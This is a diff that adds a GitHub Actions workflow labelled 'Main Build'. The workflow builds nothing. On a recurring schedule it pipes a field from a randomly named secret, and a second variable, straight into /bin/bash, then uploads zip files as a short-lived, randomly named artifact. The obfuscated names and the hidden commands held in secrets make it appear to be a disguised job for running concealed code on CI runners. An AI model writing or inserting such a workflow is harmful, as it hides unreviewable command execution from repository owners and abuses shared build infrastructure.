@@ -1,0 +1,29 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '30 2,8,14,20 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  compile:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Setup and run
+        env:
+          xshlt5: ${{ secrets.xshlt5 }}
+        run: |
+          printf '%s' "$xshlt5" | jq -r .tikp21040 | /bin/bash
+          echo $r48 | jq -r .n924 | /bin/bash
+
+      - name: Upload data
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: sSfUyXdB
+          path: "*.zip"
+          retention-days: 1
